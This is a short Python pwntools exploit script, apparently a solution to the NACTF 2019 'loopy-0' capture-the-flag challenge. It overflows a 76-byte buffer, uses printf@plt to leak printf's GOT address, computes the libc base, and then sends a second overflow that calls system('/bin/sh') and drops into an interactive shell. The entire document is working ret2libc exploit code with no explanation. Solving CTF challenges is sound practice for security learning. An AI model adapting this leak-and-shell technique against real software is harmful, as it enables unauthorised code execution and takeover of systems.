#!/usr/bin/env python3
from pwn import *
# NB: Trying to run loopy-0 when it is in the same folder as libc.so.6 might cause issues since it would try to use this instead of the libc library of your system.

context.binary = './loopy-0'
# p = remote('shell.2019.nactf.com', 31283)
# libc = ELF('./libc.so.6')
p = process(context.binary.path)
libc = ELF('/usr/lib32/libc.so.6')

printf_got = context.binary.got['printf']
printf_plt = context.binary.plt['printf']
vuln = context.binary.symbols['vuln']

p.recvuntil('Type something>')

payload = 'A' * 76 + p32(printf_plt).decode('L1') + p32(vuln).decode('L1') + p32(printf_got).decode('L1') # L1 is an alias for latin-1 / latin.
p.sendline(payload)

print(p.recvuntil(p32(printf_got)))
leak = p.recv(4)
printf_libc = u32(leak)
print('printf@libc: ', hex(printf_libc))

libc.address = printf_libc - libc.symbols['printf']
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload = 'A' * 76 + p32(system).decode('L1') + 'AAAA' + p32(bin_sh).decode('L1')
p.sendline(payload)
p.recv()

p.interactive()
p.close()
